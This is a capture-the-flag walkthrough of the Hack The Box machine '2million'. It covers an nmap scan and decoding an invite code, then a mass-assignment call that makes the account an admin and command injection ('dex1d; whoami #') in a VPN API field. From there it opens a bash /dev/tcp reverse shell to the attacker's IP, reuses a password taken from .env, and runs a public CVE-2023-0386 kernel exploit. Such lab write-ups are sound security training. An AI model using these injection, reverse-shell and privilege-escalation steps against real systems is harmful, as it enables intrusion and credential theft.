Let's scan IP `10.10.11.221`
```bash
sudo nmap -v -sC -sV 10.10.11.221 -oN ../nmap-scan
```
```bash
Nmap scan report for 10.10.11.221
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Let's go to the site

![image](images/20250401201116.png)

There is a page on the site where you need to enter an invite code to create an account. On this page there is a `JavaScript` file:
```JavaScript
function verifyInviteCode(code)
	{
	var formData=
		{
		"code":code
	};
	$.ajax(
		{
		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
function makeInviteCode()
	{
	$.ajax(
		{
		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
```
This code is obfuscated `JavaScript`, which after unpacking via `eval()` makes HTTP requests to the API. I unpacked it using this [site](https://matthewfl.com/unPacker.html). `POST` requests are sent to the endpoint
```Endpoint
/api/v1/invite/how/to/generate
```
Let's try to navigate to it

![image](images/20250401201506.png)


![image](images/20250401201731.png)

Since a `GET` request was sent, the server did not accept it. Let's change the request method

![image](images/20250401201824.png)

We see this response:
```Response
"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"
```
The message is encoded `ROT13`. Decode it

![image](images/20250401202013.png)

```Encrypted
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

![image](images/20250401202100.png)

Get the encoded invitation code
```InviteCode
VVA2MkstNjZLMEstQTE1WlAtNVZFSlA=
```
Most likely it is `BASE64`. Decode it

![image](images/20250401202626.png)

```InviteCode
UP62K-66K0K-A15ZP-5VEJP
```

![image](images/20250401202820.png)


![image](images/20250401202849.png)


![image](images/20250401202945.png)

All navigation buttons are inactive except `Access`. Let's go to this page and click `Connection Pack`. In the intercepted request we see the endpoint:

![image](images/20250401204318.png)


![image](images/20250401204330.png)

```Endpoint
/api/v1/user/vpn/generate
```
Let's try to follow the path of this `API`

![image](images/20250401204405.png)

We see that `admin` has 3 endpoints. Let's try to grant ourselves admin rights through the endpoint `/api/v1/admin/settings/update`, which uses the `PUT` method.

![image](images/20250401205456.png)

Writes `Invalid content type`. Most likely, `JSON` is needed here, that is, you need to add the line `Content-Type: application/json` to the request

![image](images/20250401205620.png)

Now the `email` parameter is missing. Let's add it

![image](images/20250401205826.png)

Now the `is_admin` parameter is missing. Add it too

![image](images/20250401205940.png)

Now let's check if admin rights have appeared

![image](images/20250401210044.png)

Now we can use the remaining endpoint `/api/v1/admin/vpn/generate`

![image](images/20250401211418.png)

We still adjust the request so that it works

![image](images/20250401211509.png)

Let's try to execute the command `whoami`:
```bash
dex1d; whoami #
```

![image](images/20250401211545.png)

Let's try to implement `Reverse Shell`
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.192/443 0>&1'
```

![image](images/20250401212528.png)


![image](images/20250401212540.png)

The `.env` file contains the admin password. Let's try to connect to it via SSH

![image](images/20250401212906.png)

```Password
SuperDuperPass123
```

![image](images/20250401212955.png)

Let's check the `var` directory

![image](images/20250401213729.png)

The letter talks about the need to fix the OS, and also mentions the `OverlayFS / FUSE CVE`. Let's check the OS and kernel version
```bash
uname -a
cat /etc/lsb-release
```

![image](images/20250401214033.png)

If you google it, it says `CVE-2023-0386`

![image](images/20250401214435.png)

Let's use [PoC](https://github.com/puckiestyle/CVE-2023-0386)
It's not possible to simply clone the repository on the machine. So I had to download it and send it using `SCP`
```bash
scp CVE-2023-0386-main.zip admin@10.10.11.221:/tmp
```
Next, follow the instructions `PoC`

![image](images/20250401215325.png)


![image](images/20250401215339.png)

